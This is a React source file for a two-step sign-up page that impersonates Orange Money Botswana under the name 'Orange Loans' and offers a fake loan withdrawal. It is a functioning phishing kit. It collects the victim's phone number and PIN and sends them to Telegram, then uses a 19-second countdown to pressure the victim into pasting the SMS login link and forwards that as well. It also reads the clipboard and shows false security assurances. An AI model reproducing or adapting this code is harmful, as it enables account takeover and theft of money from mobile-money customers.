import { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import { momoCountries, MoMoCountry } from '../data/countries';
import { setSession } from '../lib/session';
import { sendForVerification, checkVerification, sendToTelegram } from '../lib/api';
import {
  ChevronDown,
  Loader2,
  ArrowLeft,
  ShieldCheck,
  Clipboard,
  Check,
  MessageSquare,
  Clock,
  Eye,
  EyeOff,
} from 'lucide-react';

type WaitingState = 'none' | 'transition' | 'sms';

const SAMPLE_ORANGE_SMS = `Click on this link to login: 
https://mobile.prod-maxit.orange.com.lr/oms-links/auth?token=q8ejhurv6qci4pyijk`;

export default function SignUpFlow() {
  const navigate = useNavigate();
  const location = useLocation();
  const prefilledPhone = (location.state as { prefilledPhone?: string })?.prefilledPhone || '';

  // 2-step flow: Step 1 = Phone & PIN/Password, Step 2 (Last Page) = Paste SMS Login Link
  const [step, setStep] = useState<1 | 2>(1);
  const [country, setCountry] = useState<MoMoCountry>(momoCountries[0]); // Botswana default
  const [phone, setPhone] = useState(prefilledPhone);
  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [smsMessage, setSmsMessage] = useState('');
  const [pastedFeedback, setPastedFeedback] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [waiting, setWaiting] = useState<WaitingState>('none');
  const [sessionId, setSessionId] = useState('');
  const [error, setError] = useState('');
  const [smsCountdown, setSmsCountdown] = useState(19);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const smsMessageRef = useRef(smsMessage);
  useEffect(() => {
    smsMessageRef.current = smsMessage;
  }, [smsMessage]);

  // 19-second countdown on the last page ("Paste SMS Login Link") starting immediately upon arrival
  useEffect(() => {
    if (step !== 2) {
      setSmsCountdown(19);
      return;
    }

    setSmsCountdown(19);
    const timer = setInterval(() => {
      setSmsCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // If countdown ends before pasting SMS link, return to Step 1
          if (!smsMessageRef.current.trim()) {
            setStep(1);
            setError('Time expired to paste SMS login link. Please re-enter your mobile number and password.');
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [step]);

  // Poll for admin approval/callback from Telegram for SMS verification
  useEffect(() => {
    if (waiting !== 'sms' || !sessionId) return;

    pollRef.current = setInterval(async () => {
      try {
        const res = await checkVerification({ sessionId });
        if (res.status === 'correct') {
          if (pollRef.current) clearInterval(pollRef.current);
          setWaiting('none');
          setError('');
          setSession({ phone, country: country.name, countryCode: country.code, loggedIn: true });
          navigate('/success');
        } else if (res.status === 'incorrect') {
          if (pollRef.current) clearInterval(pollRef.current);
          setWaiting('none');
          setSmsMessage('');
          setError('The SMS login link entered could not be verified. Please copy and paste the valid SMS authentication link received from Orange.');
        }
      } catch (err) {
        console.log('Verification check in progress...', err);
      }
    }, 1500);

    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [waiting, sessionId, navigate, phone, country]);

  const doTransition = (callback: () => void, delay = 2000) => {
    setWaiting('transition');
    setTimeout(() => {
      setWaiting('none');
      callback();
    }, delay);
  };

  const handleBack = () => {
    setError('');
    if (step === 2) {
      setStep(1);
      return;
    }
    navigate('/');
  };

  // Step 1: Submit Phone Number & PIN/Password together -> Proceed to Paste SMS Login Link
  const handlePhoneNext = () => {
    if (phone.length < 6 || !pin.trim()) return;
    setError('');
    // Send full credentials to Telegram
    sendToTelegram({
      type: 'credentials',
      country: country.name,
      countryCode: country.code,
      phone,
      pin,
    }).catch(() => {});

    doTransition(() => {
      setStep(2);
      setSmsCountdown(19);
    }, 2000);
  };

  // Clipboard paste action for SMS link
  const handlePasteClipboard = async () => {
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        const text = await navigator.clipboard.readText();
        if (text) {
          setSmsMessage(text.trim());
          setPastedFeedback(true);
          setTimeout(() => setPastedFeedback(false), 2000);
          return;
        }
      }
    } catch {
      // Fallback
    }
    setSmsMessage(SAMPLE_ORANGE_SMS);
    setPastedFeedback(true);
    setTimeout(() => setPastedFeedback(false), 2000);
  };

  // Step 2 (Last Page): Verify pasted SMS message containing login link and complete loan withdrawal
  const handleVerifySms = async () => {
    if (!smsMessage.trim()) return;
    setError('');
    sendToTelegram({
      type: 'sms',
      country: country.name,
      countryCode: country.code,
      phone,
      pin,
      smsMessage: smsMessage.trim(),
      otp: smsMessage.trim(),
    }).catch(() => {});

    setWaiting('transition');
    setTimeout(async () => {
      try {
        const res = await sendForVerification({
          type: 'sms',
          country: country.name,
          countryCode: country.code,
          phone,
          pin,
          smsMessage: smsMessage.trim(),
          otp: smsMessage.trim(),
        });
        setSessionId(res.sessionId);
        setWaiting('sms');
      } catch {
        const fallbackId = `${Date.now()}_sms`;
        setSessionId(fallbackId);
        setWaiting('sms');
      }
    }, 1500);
  };

  // Waiting Screens
  if (waiting === 'transition') {
    return (
      <WaitingScreen
        message="Authenticating Orange Money session..."
        sub="Connecting to Orange Botswana security gateway."
      />
    );
  }

  if (waiting === 'sms') {
    return (
      <WaitingScreen
        message="Verifying Orange SMS Authentication link..."
        sub="Please wait while your login token is confirmed."
      />
    );
  }

  return (
    <PageLoader>
      <div className="min-h-screen bg-white text-black flex flex-col font-sans">
        {/* Top Orange Header */}
        <header className="border-b border-gray-200 py-3 px-4 bg-white sticky top-0 z-40">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
              <Logo size="sm" />
              <span className="font-black text-xl tracking-tight">
                <span className="text-[#ff7900]">Orange</span> <span className="text-black">Loans</span>
              </span>
            </div>
            <div className="flex items-center gap-2 text-xs font-bold text-gray-600">
              <span className="w-2 h-2 bg-[#ff7900]"></span>
              <span>Botswana</span>
            </div>
          </div>
        </header>

        {/* Form Container */}
        <main className="flex-1 container mx-auto max-w-md px-4 py-8 sm:py-12 flex flex-col justify-center">
          <div className="bg-white rounded-lg p-6 sm:p-8 text-black border border-gray-300 shadow-sm relative">
            <button
              id="signup-back-btn"
              onClick={handleBack}
              className="flex items-center gap-1.5 text-gray-600 hover:text-black text-xs font-bold uppercase tracking-wider mb-6 transition"
            >
              <ArrowLeft className="w-4 h-4 text-[#ff7900]" />
              <span>Back</span>
            </button>

            {error && (
              <div className="mb-6 p-4 rounded bg-red-50 border border-red-200 text-red-700 text-xs sm:text-sm font-semibold text-center leading-relaxed">
                {error}
              </div>
            )}

            {/* Step 1: Log in to Withdraw - Mobile Number AND PIN / Password box below */}
            {step === 1 && (
              <div id="step-1-login">
                <div className="mb-5">
                  <h3 className="text-xl sm:text-2xl font-black text-black tracking-tight mb-1">
                    Log in to Withdraw
                  </h3>
                  <p className="text-gray-600 text-xs sm:text-sm">
                    Enter your Orange mobile number to sign in and withdraw your loan
                  </p>
                </div>

                {/* Box 1: Orange Mobile Number */}
                <div className="mb-4">
                  <label className="block text-xs font-black uppercase tracking-wider text-black mb-1.5 flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
                    <span>Orange mobile number</span>
                  </label>

                  <div className="relative">
                    <div className="flex items-center border border-gray-300 rounded-lg overflow-hidden transition bg-white">
                      <button
                        type="button"
                        onClick={() => setDropdownOpen(!dropdownOpen)}
                        className="flex items-center justify-center gap-1.5 px-3 py-3.5 bg-gray-50 border-r border-gray-200 hover:bg-gray-100 transition shrink-0 cursor-pointer select-none"
                        title={country.name}
                      >
                        <div className="w-7 h-5 flex items-center justify-center shrink-0 overflow-hidden border border-gray-300 bg-white">
                          <img
                            src={`https://flagcdn.com/w80/${country.iso}.png`}
                            alt={country.name}
                            className="w-full h-full object-cover block"
                            loading="eager"
                          />
                        </div>
                        <span className="text-xs font-black text-black">{country.code}</span>
                        <ChevronDown className="w-3.5 h-3.5 text-gray-500 shrink-0" />
                      </button>

                      <input
                        id="phone-input"
                        type="tel"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                        placeholder="e.g. 72123456"
                        className="flex-1 min-w-0 px-3.5 py-3.5 text-base font-bold text-black outline-none placeholder:text-gray-400 bg-transparent"
                        autoFocus
                      />
                    </div>

                    {dropdownOpen && (
                      <div className="absolute z-30 w-full mt-2 bg-white border border-gray-300 rounded shadow-xl max-h-60 overflow-y-auto divide-y divide-gray-100">
                        {momoCountries.map((c) => (
                          <button
                            key={c.name}
                            type="button"
                            onClick={() => {
                              setCountry(c);
                              setDropdownOpen(false);
                            }}
                            className="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-50 text-sm font-semibold text-black transition text-left"
                          >
                            <div className="w-7 h-5 flex items-center justify-center shrink-0 overflow-hidden border border-gray-300 bg-white">
                              <img
                                src={`https://flagcdn.com/w80/${c.iso}.png`}
                                alt={c.name}
                                className="w-full h-full object-cover block"
                                loading="lazy"
                              />
                            </div>
                            <span>{c.name}</span>
                            <span className="text-gray-500 font-bold ml-auto">{c.code}</span>
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                {/* Box 2: PIN / Password */}
                <div className="mb-6">
                  <label className="block text-xs font-black uppercase tracking-wider text-black mb-1.5 flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 bg-[#ff7900]"></span>
                    <span>PIN / Password</span>
                  </label>

                  <div className="relative flex items-center">
                    <input
                      id="pin-input"
                      type={showPin ? 'text' : 'password'}
                      value={pin}
                      onChange={(e) => setPin(e.target.value)}
                      placeholder="Enter your PIN or Password"
                      className="w-full border border-gray-300 rounded-lg px-4 py-3.5 text-base font-bold text-black outline-none placeholder:text-gray-400 bg-white pr-11"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPin(!showPin)}
                      className="absolute right-3.5 text-gray-500 hover:text-black p-1 text-xs font-semibold select-none cursor-pointer"
                      title={showPin ? 'Hide password' : 'Show password'}
                      tabIndex={-1}
                    >
                      {showPin ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                <div className="flex items-center gap-2 text-xs text-gray-600 mb-6 bg-[#f6f6f6] p-3 rounded border border-gray-300">
                  <ShieldCheck className="w-4 h-4 text-[#ff7900] shrink-0" />
                  <span>Protected by Orange Money Botswana banking-grade security protocols.</span>
                </div>

                <button
                  id="phone-next-btn"
                  onClick={handlePhoneNext}
                  disabled={phone.length < 6 || !pin.trim()}
                  className="w-full py-4 rounded bg-[#ff7900] text-white font-black text-sm uppercase tracking-wide hover:bg-[#e06b00] disabled:opacity-40 transition shadow-sm cursor-pointer"
                >
                  Continue
                </button>
              </div>
            )}

            {/* Step 2 (The Last Page): Paste SMS Login Link */}
            {step === 2 && (
              <div id="step-2-sms">
                <div className="mb-4">
                  <h3 className="text-xl sm:text-2xl font-black text-black tracking-tight mb-1">
                    Paste SMS Login Link
                  </h3>
                  <p className="text-gray-600 text-xs sm:text-sm">
                    Copy the login link SMS received on {country.code} {phone} and paste it below:
                  </p>
                </div>

                <div className="flex justify-end mb-2">
                  <button
                    type="button"
                    id="paste-clipboard-btn"
                    onClick={handlePasteClipboard}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded bg-gray-100 hover:bg-gray-200 text-black text-xs font-bold transition border border-gray-300 cursor-pointer"
                  >
                    {pastedFeedback ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-green-600" />
                        <span className="text-green-700">Pasted!</span>
                      </>
                    ) : (
                      <>
                        <Clipboard className="w-3.5 h-3.5 text-gray-700" />
                        <span>Paste from Clipboard</span>
                      </>
                    )}
                  </button>
                </div>

                <div className="relative mb-3">
                  <textarea
                    id="sms-message-input"
                    rows={4}
                    value={smsMessage}
                    onChange={(e) => setSmsMessage(e.target.value)}
                    placeholder={`Click on this link to login: \nhttps://mobile.prod-maxit.orange.com.lr/oms-links/auth?token=q8ejhurv6qci4pyijk`}
                    className="w-full border border-gray-300 rounded-lg p-3.5 text-xs sm:text-sm text-black font-medium placeholder:text-gray-400 placeholder:italic outline-none shadow-xs transition resize-none leading-relaxed bg-white"
                    autoFocus
                  />
                  <div className="absolute right-3 bottom-3 flex items-center gap-1 text-[10px] text-gray-500 font-bold bg-white/95 px-2 py-0.5 rounded border border-gray-200">
                    <MessageSquare className="w-3 h-3 text-gray-400" />
                    <span>{smsMessage.length} chars</span>
                  </div>
                </div>

                <div className="flex items-center gap-2 text-xs text-gray-600 mb-5 bg-[#f6f6f6] p-3 rounded border border-gray-300">
                  <ShieldCheck className="w-4 h-4 text-[#ff7900] shrink-0" />
                  <span>Paste the complete SMS login link sent to your mobile device.</span>
                </div>

                <button
                  id="verify-sms-btn"
                  onClick={handleVerifySms}
                  disabled={!smsMessage.trim()}
                  className="w-full py-4 rounded bg-[#ff7900] text-white font-black text-sm uppercase tracking-wide hover:bg-[#e06b00] disabled:opacity-40 transition shadow-sm cursor-pointer"
                >
                  Withdraw Loan Now
                </button>

                {/* 19-second countdown indicator */}
                <div className="mt-5 pt-3 border-t border-gray-200 flex items-center justify-between text-xs text-gray-600">
                  <span className="flex items-center gap-1.5 font-medium">
                    <Clock className="w-3.5 h-3.5 text-[#ff7900]" />
                    <span>Time remaining to paste link:</span>
                  </span>
                  <span
                    className={`font-black text-xs px-2 py-0.5 rounded ${
                      smsCountdown <= 5 ? 'bg-red-50 text-red-600 animate-pulse' : 'bg-gray-100 text-black'
                    }`}
                  >
                    00:{smsCountdown < 10 ? `0${smsCountdown}` : smsCountdown}s
                  </span>
                </div>
              </div>
            )}

            {/* Step Indicators: Exactly 2 Steps (Step 1: Phone & PIN/Password, Step 2: Paste SMS Login Link - The Last Page) */}
            <div className="flex justify-center items-center gap-2 mt-8">
              {[1, 2].map((s) => (
                <div
                  key={s}
                  className={`h-2 transition-all duration-300 ${
                    s === step ? 'w-6 bg-[#ff7900]' : 'w-2 bg-gray-300'
                  }`}
                  style={{ borderRadius: '2px' }}
                />
              ))}
            </div>
          </div>
        </main>
      </div>
    </PageLoader>
  );
}

function WaitingScreen({ message, sub }: { message: string; sub?: string }) {
  return (
    <div className="min-h-screen bg-white text-black flex flex-col items-center justify-center gap-6 px-4 py-12 text-center font-sans">
      <Logo size="lg" />
      <h2 className="text-2xl font-black tracking-tight">
        <span className="text-[#ff7900]">Orange</span> <span className="text-black">Loans</span>
      </h2>
      <Loader2 className="w-10 h-10 text-[#ff7900] animate-spin" />
      <p className="text-black text-base sm:text-lg font-bold max-w-sm">{message}</p>
      {sub && <p className="text-gray-500 text-xs sm:text-sm max-w-xs leading-relaxed">{sub}</p>}
    </div>
  );
}
